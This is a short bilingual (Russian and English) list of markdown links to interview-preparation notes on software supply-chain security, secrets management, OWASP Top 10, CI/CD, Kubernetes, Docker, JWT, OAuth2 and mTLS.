- [Secrets Management](secrets-management-interview.md) — protection of signing keys и CI creds
- [OWASP Top 10](owasp-top10-interview.md) — A06 Vulnerable & Outdated Components
- [Application Security](application-security-interview.md) — общая картина AppSec
- [CI/CD Pipeline Design](../cicd/pipeline-design-interview.md) — где security controls встраиваются
- [Deployment Strategies](../cicd/deployment-strategies-interview.md) — admission controllers для signed artifacts
- [Kubernetes](../devops/kubernetes-interview.md) — admission, pod security, image verification
- [Docker](../devops/docker-interview.md) — image signing, scanning
- [Observability](../monitoring/observability-interview.md) — auditing supply chain events

- [Application Security](application-security-interview.md)
- [Authentication and Authorization Patterns](authentication-authorization-patterns-interview.md)
- [JWT](jwt-interview.md)
- [mTLS (Mutual TLS)](mtls-interview.md)
- [OAuth2](oauth2-interview.md)
- [OWASP Top 10](owasp-top10-interview.md)
